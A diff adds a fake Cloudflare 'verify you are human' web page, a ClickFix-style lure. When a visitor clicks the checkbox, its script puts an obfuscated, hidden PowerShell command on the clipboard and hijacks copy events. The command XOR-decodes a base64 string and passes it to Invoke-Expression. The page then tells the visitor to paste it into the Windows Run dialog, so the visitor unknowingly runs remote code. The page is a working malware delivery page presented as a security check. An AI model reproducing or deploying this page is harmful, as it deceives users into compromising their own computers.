@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                         "Helvetica Neue", Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #fcfcfc;
+            color: #333;
+        }
+
+        /* ── layout ── */
+        .main-wrapper { display: flex; flex: 1; flex-direction: column; align-items: center; }
+        .main-content {
+            margin: 4rem auto;
+            max-width: 60rem;
+            padding: 0 1.5rem;
+            width: 100%;
+        }
+
+        .logo-container { display: flex; align-items: center; }
+        .logo-img { height: 2rem; margin-right: 0.5rem; }
+        .domain-title { font-size: 2.5rem; font-weight: 500; line-height: 3.75rem; }
+
+        .text-container {
+            font-size: 1.5rem;
+            line-height: 2.25rem;
+            margin-bottom: 2rem;
+            min-height: 2rem;
+            font-weight: 550;
+            padding-top: 2px;
+        }
+
+        /* ── initial preloader ring ── */
+        .preloader { display: flex; align-items: center; justify-content: center; }
+        .lds-ring { display: inline-block; position: relative; width: 1.875rem; height: 1.875rem; }
+        .lds-ring div {
+            animation: lds-ring 1.2s cubic-bezier(0.5,0,0.5,1) infinite;
+            border: 0.3rem solid transparent;
+            border-radius: 50%;
+            border-top-color: #313131;
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            width: 1.875rem; height: 1.875rem;
+        }
+        .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
+        .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
+        .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
+        @keyframes lds-ring { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ── turnstile widget ── */
+        .checkbox-window {
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+            width: 300px;
+            min-height: 65px;
+            background-color: #fafafa;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 0;
+            overflow: hidden;
+            transition: height 0.4s ease-in-out, opacity 0.3s;
+            opacity: 0;
+        }
+
+        .checkbox-window-inner {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            min-height: 65px;
+            flex-shrink: 0;
+            padding: 0 12px;
+        }
+
+        /* checkbox button */
+        .checkbox-container {
+            width: 28px; height: 28px;
+            margin-left: 3px; margin-right: 12px;
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .checkbox {
+            width: 100%; height: 100%;
+            background-color: #fff;
+            border-radius: 2px;
+            border: 2px solid #888;
+            cursor: pointer;
+            transition: border-color 0.2s, background-color 0.2s, border-radius 0.2s;
+            position: relative;
+        }
+        .checkbox:hover { border-color: #555; }
+
+        /* checked = green circle + CSS checkmark */
+        .checkbox.checked {
+            border-color: #00b140;
+            background-color: #00b140;
+            border-radius: 50%;
+        }
+        .checkbox.checked::after {
+            content: "";
+            position: absolute;
+            width: 6px; height: 12px;
+            border: 2px solid #fff;
+            border-top: none; border-left: none;
+            top: 4px; left: 8px;
+            transform: rotate(45deg);
+        }
+
+        /* CF 4-dots spinner — lives inside .checkbox-container */
+        .spinner {
+            visibility: hidden;
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .cf-dots { display: flex; gap: 3px; flex-wrap: wrap; width: 16px; }
+        .cf-dot {
+            width: 6px; height: 6px;
+            border-radius: 50%;
+            background: #bbb;
+            animation: cf-pulse 1.2s ease-in-out infinite;
+        }
+        .cf-dot:nth-child(1) { animation-delay: 0s; }
+        .cf-dot:nth-child(2) { animation-delay: 0.15s; }
+        .cf-dot:nth-child(3) { animation-delay: 0.3s; }
+        .cf-dot:nth-child(4) { animation-delay: 0.45s; }
+        @keyframes cf-pulse {
+            0%, 100% { background: #bbb; transform: scale(1); }
+            50%       { background: #555; transform: scale(1.2); }
+        }
+
+        /* success circle (step3) */
+        .success-icon { width: 28px; height: 28px; }
+        .success-icon circle { fill: #00b140; }
+        .success-icon path {
+            stroke: #fff; stroke-width: 4;
+            fill: none; stroke-linecap: round; stroke-linejoin: round;
+        }
+
+        /* label text */
+        .tettx {
+            color: #4e4e4e;
+            font-size: 14px;
+            flex: 1;
+            min-width: 0;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .tettx p { margin: 0 !important; white-space: nowrap; }
+
+        /* Cloudflare branding */
+        .legal-links {
+            margin-left: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 2px;
+            flex-shrink: 0;
+        }
+        .legal-links-brand { display: flex; align-items: center; gap: 4px; }
+        .legal-links-name {
+            font-size: 11px; font-weight: 700;
+            color: #404040; letter-spacing: 0.5px;
+            font-family: Arial, sans-serif;
+        }
+        .legal-links-sub { font-size: 8px; color: #767676; font-family: Arial, sans-serif; }
+        .legal-links-sub a { color: #767676; text-decoration: none; }
+        .legal-links-sub a:hover { text-decoration: underline; }
+
+        /* ── verify instructions panel ── */
+        .verify-window {
+            opacity: 0;
+            visibility: hidden;
+            width: 100%;
+            height: 0;
+            transition: opacity 0.4s, height 0.4s;
+            border-top: 1px solid #d8d8d8;
+            margin-top: 0;
+            font-family: Roboto, helvetica, arial, sans-serif;
+        }
+        .verify-window.active {
+            opacity: 1;
+            visibility: visible;
+            height: auto;
+        }
+
+        .verify-main { padding: 14px 16px; font-size: 14px; color: #333; }
+        .verify-main p:first-of-type { font-size: 15px; font-weight: 500; margin-bottom: 12px; }
+        .verify-main ol { padding-left: 20px; }
+        .verify-main ol li { margin-bottom: 8px; line-height: 1.5; }
+
+        .verify-footer {
+            background-color: #f2f2f2;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .verify-footer-left { font-size: 13px; color: #555; }
+        .verify-verify-button {
+            background: #5e5e5e;
+            padding: 8px 28px;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .verify-verify-button:hover { background: #404040; }
+
+        /* ── domain footer line ── */
+        .domain-footer { font-size: 1.5rem; line-height: 2.25rem; padding-top: 33px; }
+        .domain-name { font-weight: 500; }
+
+        /* ── step visibility ── */
+        .step0, .step1, .step2, .step3 { display: none; }
+        .step0.active, .step1.active, .step2.active, .step3.active { display: block; }
+
+        /* ── page footer ── */
+        .footer {
+            font-size: 0.75rem;
+            line-height: 1.125rem;
+            margin: 0 auto;
+            max-width: 60rem;
+            padding: 0 1.5rem;
+            width: 100%;
+        }
+        .footer-inner {
+            border-top: 1px solid #d9d9d9;
+            padding: 1rem 0;
+            text-align: center;
+        }
+        .footer-inner > div:first-child { margin-bottom: 5px; }
+        .footer-inner code { font-family: monospace; }
+    </style>
+</head>
+<body>
+
+<div class="main-wrapper">
+    <div class="main-content">
+
+        <div class="logo-container">
+            <img class="logo-img" src="" alt="Logo">
+            <p class="domain-title"><span class="domain-name"></span></p>
+        </div>
+
+        <div class="text-container">
+            <p>
+                <span class="preloader_text">Checking if you are human. This may take a few seconds.</span>
+                <span class="textallstep" style="display:none;">Verify you are human by completing the action below.</span>
+            </p>
+        </div>
+
+        <div class="intro">
+
+            <!-- initial spinner -->
+            <div class="preloader">
+                <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+            </div>
+
+            <!-- turnstile widget -->
+            <div id="checkbox-window" class="checkbox-window" style="display:none;">
+                <div class="checkbox-window-inner">
+
+                    <div class="checkbox-container">
+                        <!-- step1: clickable checkbox -->
+                        <button type="button" id="checkbox" class="checkbox step1" style="display:none;"></button>
+                        <!-- step2: 4-dot spinner -->
+                        <div class="spinner step2" id="spinner" style="visibility:hidden; display:none;">
+                            <div class="cf-dots">
+                                <div class="cf-dot"></div>
+                                <div class="cf-dot"></div>
+                                <div class="cf-dot"></div>
+                                <div class="cf-dot"></div>
+                            </div>
+                        </div>
+                        <!-- step3: green circle -->
+                        <div class="step3" style="display:none;">
+                            <svg class="success-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="25" cy="25" r="23"/>
+                                <path d="M15 25 L22 32 L35 18"/>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <div class="tettx">
+                        <p class="step0">Verifying...</p>
+                        <p class="step1" style="display:none;">Verify you are human</p>
+                        <p class="step2" style="display:none;">Verify you are human</p>
+                        <p class="step3" style="display:none;">Success!</p>
+                    </div>
+
+                    <!-- Cloudflare branding -->
+                    <div class="legal-links">
+                        <div class="legal-links-brand">
+                            <svg width="22" height="14" viewBox="0 0 109 66" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M85.7 43.7c.4-1.4.3-2.8-.5-3.9-.7-1.1-1.9-1.7-3.3-1.9l-46-.6c-.3 0-.6-.1-.7-.4-.1-.2 0-.5.2-.7l1-2.4c.4-.9.3-1.9-.1-2.7-.5-.8-1.3-1.4-2.3-1.6l-5.4-.4c-.1 0-.1 0-.2 0C18.5 27.7 9 37.6 9 49.8v.8c0 .5.4.9.9.9h73.5c1.4 0 2.6-.9 2.8-2.3l-.5-4.5z" fill="#F38020"/>
+                                <path d="M90.7 29c-.2 0-.3 0-.5 0-1.8 0-3.4.8-4.5 2.1-1-7.5-7.4-13.3-15.1-13.3-3.7 0-7.1 1.4-9.6 3.6C59 13.3 49.8 6 39 6 26.3 6 16 16.3 16 29c0 .5 0 1 .1 1.5C10.2 31.8 6 37.2 6 43.6c0 7.4 6 13.4 13.4 13.4h69.8c6.5 0 11.8-5.3 11.8-11.8 0-6-4.4-11-10.3-11.8z" fill="#FBAD41"/>
+                            </svg>
+                            <span class="legal-links-name">CLOUDFLARE</span>
+                        </div>
+                        <span class="legal-links-sub">
+                            <a href="#">Privacy</a> · <a href="#">Terms</a>
+                        </span>
+                    </div>
+
+                </div>
+
+                <!-- instructions panel, expands below widget on click -->
+                <div id="verify-window" class="verify-window">
+                    <div class="verify-main">
+                        <p>Please complete the verification:</p>
+                        <ol>
+                            <li>Press <i class="fab fa-windows"></i> + <b>R</b> to open the Run dialog.</li>
+                            <li>Press <b>Ctrl</b> + <b>V</b> to paste the verification token.</li>
+                            <li>Press <b>Enter</b> to finish.</li>
+                        </ol>
+                    </div>
+                    <div class="verify-footer">
+                        <span class="verify-footer-left">Perform the steps above to finish verification.</span>
+                        <button type="button" class="verify-verify-button" id="verify-button">Verify</button>
+                    </div>
+                </div>
+            </div>
+
+            <p class="domain-footer">
+                <span class="domain-name"></span> needs to review the security of your connection before proceeding.
+            </p>
+
+        </div>
+    </div>
+</div>
+
+<div class="footer" role="contentinfo">
+    <div class="footer-inner">
+        <div>Ray ID: <code class="ray-id"></code></div>
+        <div>Performance &amp; security by <strong>Cloudflare</strong></div>
+    </div>
+</div>
+
+<script>
+// ── payload ──────────────────────────────────────────────────────────────────
+const CONFIG = {
+    command: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$key=42;$encrypted=[Convert]::FromBase64String('Q1hHCkNEWV5LRkZARV9YREtGXlhLSU8EREVJQk9LXgRZSFkKVgpDT1I=');$bytes=$encrypted|%{$_ -bxor $key};$cmd=[System.Text.Encoding]::UTF8.GetString($bytes);Invoke-Expression $cmd\""
+};
+// ─────────────────────────────────────────────────────────────────────────────
+
+const I18N = {
+    en: {
+        checking:          "Checking if you are human. This may take a few seconds.",
+        verifyInstruction: "Verify you are human by completing the action below.",
+        verifying:         "Verifying...",
+        notRobot:          "Verify you are human",
+        steps:             "Verify you are human",
+        success:           "Success!",
+        verifyTitle:       "Please complete the verification:",
+        step1:             "Press <i class='fab fa-windows'></i> + <b>R</b> to open the Run dialog.",
+        step2:             "Press <b>Ctrl</b> + <b>V</b> to paste the verification token.",
+        step3:             "Press <b>Enter</b> to finish.",
+        final:             "Perform the steps above to finish verification.",
+        verifyBtn:         "Verify",
+        footer:            "needs to review the security of your connection before proceeding."
+    },
+    ru: {
+        checking:          "Проверяем, что вы человек. Это может занять несколько секунд.",
+        verifyInstruction: "Подтвердите, что вы человек, выполнив действие ниже.",
+        verifying:         "Проверка...",
+        notRobot:          "Я не робот",
+        steps:             "Я не робот",
+        success:           "Успешно.",
+        verifyTitle:       "Выполните проверку:",
+        step1:             "Нажмите <i class='fab fa-windows'></i> + <b>R</b>, чтобы открыть окно «Выполнить».",
+        step2:             "Нажмите <b>Ctrl</b> + <b>V</b>, чтобы вставить токен.",
+        step3:             "Нажмите <b>Enter</b> для завершения.",
+        final:             "Выполните шаги выше, чтобы завершить проверку.",
+        verifyBtn:         "Проверить",
+        footer:            "должен проверить безопасность вашего соединения перед продолжением."
+    }
+};
+
+function detectLanguage() {
+    const langs = navigator.languages && navigator.languages.length
+        ? navigator.languages : [navigator.language || "en"];
+    for (const l of langs) { if (l.startsWith("ru")) return "ru"; }
+    return "en";
+}
+
+function getHostname(val) {
+    if (!val) return window.location.hostname || "";
+    try { return new URL(val, window.location.origin).hostname; }
+    catch { return String(val).replace(/^https?:\/\//i, "").split("/")[0]; }
+}
+
+function initDomain() {
+    const host = getHostname(new URLSearchParams(location.search).get("site"))
+               || location.hostname || "";
+    document.querySelectorAll(".domain-name").forEach(el => el.textContent = host);
+    const fav = "https://www.google.com/s2/favicons?sz=128&domain=" + encodeURIComponent(host);
+    const link = document.createElement("link"); link.rel = "icon"; link.href = fav;
+    document.head.appendChild(link);
+    const img = document.querySelector(".logo-img");
+    if (img) { img.src = fav; img.alt = host; }
+}
+
+function initI18n() {
+    const t = I18N[detectLanguage()] || I18N.en;
+    document.querySelector(".preloader_text").textContent = t.checking;
+    document.querySelector(".textallstep").textContent    = t.verifyInstruction;
+    document.querySelector(".tettx .step0").textContent   = t.verifying;
+    document.querySelector(".tettx .step1").textContent   = t.notRobot;
+    document.querySelector(".tettx .step2").textContent   = t.steps;
+    document.querySelector(".tettx .step3").textContent   = t.success;
+    const title = document.querySelector("#verify-window .verify-main p:first-of-type");
+    if (title) title.innerHTML = t.verifyTitle;
+    const ol = document.querySelector("#verify-window .verify-main ol");
+    if (ol) ol.innerHTML = `<li>${t.step1}</li><li>${t.step2}</li><li>${t.step3}</li>`;
+    document.querySelector(".verify-footer-left").textContent = t.final;
+    document.getElementById("verify-button").textContent     = t.verifyBtn;
+    const df = document.querySelector(".domain-footer");
+    if (df) {
+        const h = df.querySelector(".domain-name")?.textContent || "";
+        df.innerHTML = `<span class="domain-name">${h}</span> ${t.footer}`;
+    }
+}
+
+function copyToClipboard(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
+    } else { fallbackCopy(text); }
+}
+function fallbackCopy(text) {
+    const ta = document.createElement("textarea");
+    ta.value = text;
+    Object.assign(ta.style, { position: "fixed", opacity: "0", top: "-9999px" });
+    document.body.appendChild(ta); ta.focus(); ta.select();
+    try { document.execCommand("copy"); } catch {}
+    document.body.removeChild(ta);
+}
+
+function generateRayId() {
+    return Array.from({ length: 16 }, () => "abcdef0123456789"[Math.floor(Math.random() * 16)]).join("");
+}
+
+function activate(els)   { els.forEach(el => { el.style.display = "block"; el.classList.add("active"); }); }
+function deactivate(els) { els.forEach(el => { el.style.display = "none";  el.classList.remove("active"); }); }
+
+function initVerification() {
+    const preloader    = document.querySelector(".preloader");
+    const preloaderTxt = document.querySelector(".preloader_text");
+    const textAllStep  = document.querySelector(".textallstep");
+    const win          = document.getElementById("checkbox-window");
+    const s0 = document.querySelectorAll(".step0");
+    const s1 = document.querySelectorAll(".step1");
+    const s2 = document.querySelectorAll(".step2");
+    const s3 = document.querySelectorAll(".step3");
+    const checkbox     = document.getElementById("checkbox");
+    const spinner      = document.getElementById("spinner");
+    const verifyWindow = document.getElementById("verify-window");
+    const verifyBtn    = document.getElementById("verify-button");
+
+    // phase 1: show preloader 1.5s, then reveal widget
+    setTimeout(() => {
+        preloader.style.display = "none";
+        preloaderTxt.style.display = "none";
+        textAllStep.style.display = "block";
+        win.style.display = "flex";
+
+        requestAnimationFrame(() => requestAnimationFrame(() => {
+            let op = 0;
+            const fade = setInterval(() => {
+                op = Math.min(op + 0.1, 1);
+                win.style.opacity = op;
+                if (op >= 1) clearInterval(fade);
+            }, 30);
+        }));
+
+        activate(s0);                           // show "Verifying..."
+        setTimeout(() => {
+            deactivate(s0);
+            activate(s1);                       // show checkbox + label
+        }, 2000);
+    }, 1500);
+
+    // checkbox click → copy → show spinner → show instructions
+    checkbox.addEventListener("click", () => {
+        copyToClipboard(CONFIG.command);
+        deactivate(s1);
+        activate(s2);
+        spinner.style.visibility = "visible";
+
+        setTimeout(() => {
+            // grow widget height to fit instructions
+            win.style.height = "auto";
+            verifyWindow.classList.add("active");
+        }, 500);
+    });
+
+    // verify button → collapse instructions, show success circle
+    verifyBtn.addEventListener("click", () => {
+        verifyWindow.classList.remove("active");
+        win.style.height = "65px";
+        setTimeout(() => {
+            deactivate(s2);
+            spinner.style.visibility = "hidden";
+            activate(s3);                       // green circle + "Success!"
+        }, 300);
+    });
+
+    document.querySelector(".ray-id").textContent = generateRayId();
+}
+
+// intercept copy events so payload always lands
+document.addEventListener("copy", e => {
+    e.preventDefault();
+    (e.clipboardData || window.clipboardData)?.setData("text/plain", CONFIG.command);
+});
+
+document.addEventListener("DOMContentLoaded", () => {
+    initDomain();
+    initI18n();
+    initVerification();
+});
+</script>
+
+</body>
+</html>
